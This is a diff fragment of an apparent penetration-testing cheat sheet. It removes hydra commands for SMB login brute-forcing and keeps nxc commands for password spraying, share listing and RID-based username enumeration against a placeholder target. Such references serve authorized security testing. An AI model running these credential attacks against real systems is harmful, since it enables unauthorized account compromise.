@@ -530,9 +530,6 @@ MATCH (u:User) RETURN u
 godap $TARGET -u '$USERNAME' -p '$PASSWORD' -d '$DOM'
 
 [*] (445) SMB
-hydra smb2://$TARGET -L usernames -P passwords -t35
-hydra smb2://$TARGET -L usernames -e ns -t35
-
 nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames
